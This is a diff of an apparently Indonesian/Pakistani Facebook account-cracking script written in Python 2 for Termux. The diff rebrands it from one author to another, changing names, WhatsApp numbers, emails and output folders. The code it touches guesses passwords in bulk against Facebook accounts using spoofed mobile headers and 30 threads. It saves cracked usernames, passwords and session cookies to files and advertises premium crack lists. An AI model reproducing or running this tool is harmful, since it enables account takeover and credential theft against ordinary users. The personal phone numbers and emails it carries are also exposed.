@@ -2,12 +2,12 @@
 # coding=utf-8
 ##########################################################
 # AUTHOR : JEECK X NANO,RISKY,XENZI X GANZ,YUMSAA X NANO #
-# CONTAK : SHAHZADA [WHATSAPP]                       #
+# CONTAK : 081392505882 [WHATSAPP]                       #
 # GITHUB : HTTPS://GITHUB.COM/JEECK-XN                   #
 ##########################################################
 #   OPEN SOURCE YA NGAB JANGAN DI PERJUAL BELIKAN OKH    #
 ##########################################################
-#   JIKA ADA EROR TOLONG WHATSAPP SAYA : SHAHZADA    #
+#   JIKA ADA EROR TOLONG WHATSAPP SAYA : 081392505882    #
 ##########################################################
 ##############    JANGAN BILANK SC INI RECODE BWANK :)   #
 # >_ TERMUX  #       NAMA KU JECKO AKU ADA JECKO         #
@@ -112,7 +112,7 @@ def tik():
         print ('\r%s%s menghapus token %s'%(M,___panggilan_____x______nano_____,o)),
         sys.stdout.flush();jeda(1)
 def folder(): # < Buat follder
-	try:os.mkdir('SHAHZADA')
+	try:os.mkdir('Riaz')
 	except:pass
 	try:os.mkdir('data')
 	except:pass
@@ -121,8 +121,18 @@ def folder(): # < Buat follder
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
-  • CODE BY BIDRA SHAHZADA
- • HTTPS://GITHUB.COM/BIGRASHAHZADA •
+# BUAT LOGO
+def banner():
+	print('''
+██████╗ ██╗ █████╗ ███████╗
+██╔══██╗██║██╔══██╗╚══███╔╝
+██████╔╝██║███████║  ███╔╝ 
+██╔══██╗██║██╔══██║ ███╔╝  
+██║  ██║██║██║  ██║███████╗
+╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
+  • CODE BY RIAZKHAN •
+ • HTTPS://GITHUB.COM/Riazkiller •
+
 ''')
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def mmmasuk():
@@ -149,6 +159,7 @@ def mmmasuk():
         	print("%s [!] Token invalid "%(M));masuk()
     elif _jeeck_xnxcode_ in ('2', '02'):
     	jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  ================================================")
+        jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m                JOIN GROUP WA + FB ")
         jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  ================================================")
         jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (1 hackers termux pakistan [ FACEBOOK ] ")
         jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (2 RIAZKHAN TEAM [ WHATSAPP ] ")
@@ -219,14 +230,14 @@ def menu():
             dirs = os.listdir("hasil")
             print
             for file in dirs:
-                print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berikut adalah FILE SHAHZADA CRACK ")
+                print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berikut adalah FILE RIAZ CRACK ")
                 jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m ___/--> \033[0;33m%s"%(file));jeda(0.2)
             print("\n %s[%s+%s] Contoh : CP-%s-%s-%s%s"%(B,B,B,P,op,ta,".txt"))
             file = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ");jeda(0.2)
             if file == "":
                 jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m File tidak di temukan :)")
 #            total = open(" hasil/%s"%(file)).read().splitlines()
-            total = open("SHAHZADA/%s"%(file)).read().splitlines()
+            total = open("RIAZ/%s"%(file)).read().splitlines()
             print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
             nm_file = ("%s"%(file)).replace("-", " ")
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Total akun : \033[0;33m%s"%(len(total)))
@@ -273,8 +284,9 @@ def gobloklu():
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Kamu bukan userpermium")
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m hubungi author jika ingin membeli FILE PREMIUM")
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m CONTACK :")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 03205039694")
-   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : Faiso5556@gmail.com")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Wa : 03188214452")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Fb : https://www.facebook.com/Riaz-hacker-100835532473815/")
+   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m         ( Em : riazkhanrna@gmail.com")
    raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
    masuk()
 # BIASA :V
@@ -304,8 +316,8 @@ def pendahuluanxnano():
    jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m If you don't replace the crack, it will be an error")
    jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Karena tidak mengganti Crack Akan EROR")
    jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m If there is a bug, please contact immediately")
-   jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m FAISO LOVE AYESHO ")
-   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 03205039694")
+   jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Jika Ada Bug Segera Hubungi ")
+   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 03188214452")
    jeeck("\033[0;36m[\033[0;35m8\033[0;36m]\033[0;00m if you want to take useragent select number 6")
    jeeck("\033[0;36m[\033[0;35m9\033[0;36m]\033[0;00m jika ingin mengambil useragent pilih nomor 6")
    raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
@@ -570,8 +582,8 @@ class ngentod:
                             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");self._jeeck_X_nano_()
                         elif _jeeck_X_ in ('1', '01'):
  #                           
-                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s BIGRA/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s+%s] akun %sCP %stersimpan di => %sSHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+                            print '%s [%s+%s] akun %sCP %stersimpan di => %sRIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -581,8 +593,8 @@ class ngentod:
                             os.remove(self.apk);exit()
                         elif _jeeck_X_ in ('2', '02'):
                             
-                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s BIGRA/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s+%s] akun %sCP %stersimpan di => %SHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+                            print '%s [%s+%s] akun %sCP %stersimpan di => %RIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -592,8 +604,8 @@ class ngentod:
                             os.remove(self.apk);exit()
                         elif _jeeck_X_ in ('3', '03'):
                             
-                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s BIGRA/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s+%s] akun %sCP %stersimpan di => %sSHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+                            print '%s [%s+%s] akun %sCP %stersimpan di => %sRIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -604,8 +616,8 @@ class ngentod:
                         elif _jeeck_X_ in ('4', '04'):
 #                            
                         
-                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s SHAHZADA/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s+%s] akun %sCP %stersimpan di => %sSHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+                            print '%s [%s+%s] akun %sCP %stersimpan di => %sRIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -627,7 +639,7 @@ class ngentod:
             print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m B-Api [ FAST CRACK ]")
             print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ RECOMENDED V1 ]]")
             print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free fb[ Selow[ RECOMENDED V2 ]]")
-            jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK SHAHZADA RECOMENDED V3 ]]")
+            jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK RIAZ RECOMENDED V3 ]]")
             self.langsung()
         else:
             jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
@@ -653,8 +665,8 @@ class ngentod:
             os.remove(self.apk);exit()
         elif suuu in ('2', '02'):
 
-            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s BIGRA/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-            print '%s [%s+%s] akun %sCP %stersimpan di => %sSHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
+            print '%s [%s+%s] akun %sCP %stersimpan di => %sRIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -670,7 +682,7 @@ class ngentod:
         elif suuu in ('3', '03'):
 
             print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s RIAZ/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-            print '%s [%s+%s] akun %sCP %stersimpan di => %sSHAHZADA/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s+%s] akun %sCP %stersimpan di => %sRIAZ/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
                 for akun in self.id:
                     try:
@@ -748,7 +760,7 @@ class ngentod:
                 except: pass
                 print '\r %s%s | %s           ' % (K,user,pw)
                 cp.append('%s | %s' % (user,pw))
-                open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
+                open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                 break
                 continue
         loop += 1
@@ -798,7 +810,7 @@ class ngentod:
                     month = bulan1[month]
                     print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
-                    open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
+                    open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
@@ -846,7 +858,7 @@ class ngentod:
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s%s | %s | %s  ' % (H,user,pw,kuki)
                 ok.append("%s | %s | %s"% (user,pw,kuki))
-                open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s\n"%(user,pw,kuki))
+                open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s\n"%(user,pw,kuki))
                 break
                 continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
@@ -857,7 +869,7 @@ class ngentod:
                     month = bulan1[month]
                     print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
-                    open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
+                    open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
@@ -866,7 +878,7 @@ class ngentod:
                 except: pass
                 print '\r %s%s | %s            ' % (K,user,pw)
                 cp.append("%s | %s"% (user,pw))
-                open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
+                open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                 break
                 continue
         loop += 1
@@ -916,7 +928,7 @@ class ngentod:
                     month = bulan1[month]
                     print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
-                    open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
+                    open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                     break
                 except KeyError:
                     day = ''
@@ -925,12 +937,12 @@ class ngentod:
                 except: pass
                 print '\r %s%s | %s              ' % (K,user,pw)
                 cp.append("%s | %s"% (user,pw))
-                open('SHAHZADA/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
+                open('RIAZ/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                 break
                 continue
         loop += 1
        # 
-        print('\r [ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%S:%LOVE:%A'),loop,len(self.id),len(ok),len(cp))),
+        print('\r [ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
 
 def useragent():
